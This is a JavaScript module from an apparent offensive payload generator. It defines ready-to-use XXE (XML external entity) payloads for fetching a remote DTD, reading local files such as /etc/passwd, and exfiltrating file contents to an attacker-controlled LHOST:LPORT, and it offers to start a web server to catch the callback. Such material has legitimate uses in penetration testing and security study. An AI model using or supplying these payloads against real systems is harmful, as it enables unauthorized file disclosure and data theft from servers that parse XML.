var prompt = require('prompt');
var log = require('cli-color');
var options = log.yellow
var yellow = log.yellow
var blue = log.cyan
var black = log.blackBright
var green = log.green
var red = log.red
var M = require('mstring')
var question = require('../modules/questionUser');

var web = require("../modules/webserver/webserver.js")

// Payload Array
arrayWeb = []

var Load = function(obj){
	arrayWeb.push(obj)
}

/* 
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis
	
	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>	 


*/
// ########## XXE Attacks


Load({
	title: "Remote DTD File Parsing",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
	category: "XML",
	callback: function(returnToPrepare){
		question.ask("Should I fire up a web server for you? (Y/n)", returnToPrepare, "web")
	}
})


Load({
	title: "XXE (Local File Read)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]]>&bar;",
	category: "XML",
	callback: function(returnToPrepare){
		
	  question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")			
		
	}
})


		//

Load({
	title: "XXE (Local File Exfiltration using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send.dtd\">%dtd;%send; ]]>",
	category: "XML",
	callback: function(returnToPrepare){
		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
	}
})



var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayWeb,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayWeb.length;i++){
			if (arrayWeb[i].category === value){
				tempArray.push(arrayWeb[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayWeb.length;i++){
			if(unique[arrayWeb[i].category]){

			}
			else {
				unique[arrayWeb[i].category] = true;
				uniqueCategories.push(arrayWeb[i].category)
			} 
		return uniqueCategories
		}
	}
}